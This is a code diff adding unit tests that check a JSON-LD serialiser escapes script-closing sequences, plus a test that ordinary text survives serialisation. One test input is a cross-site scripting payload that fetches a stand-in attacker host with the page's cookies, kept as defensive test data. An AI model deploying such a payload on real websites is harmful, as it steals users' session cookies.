@@ -21,7 +21,25 @@ import {
   assertTurnstile,
   isTurnstileResponseValid,
 } from '#/backend/shared/turnstile'
+import { toJsonLd } from '#/frontend/lib/seo'
 import { buildContentSecurityPolicy, validateMutationRequest } from '#/start'
+
+describe('structured data', () => {
+  it('cannot close the script block it is written into', () => {
+    const serialised = toJsonLd({
+      description: 'x</script><script>fetch("https://evil.example/"+document.cookie)</script>',
+    })
+
+    expect(serialised).not.toContain('</script>')
+    expect(serialised).not.toContain('<')
+    // Still the same JSON: the escapes parse back to the characters they hide.
+    expect(JSON.parse(serialised).description).toContain('</script>')
+  })
+
+  it('leaves ordinary text readable', () => {
+    expect(JSON.parse(toJsonLd({ name: 'Brandt & Söhne' })).name).toBe('Brandt & Söhne')
+  })
+})
 
 describe('request security', () => {
   it('rejects missing and cross-site origins on data-changing API requests', () => {
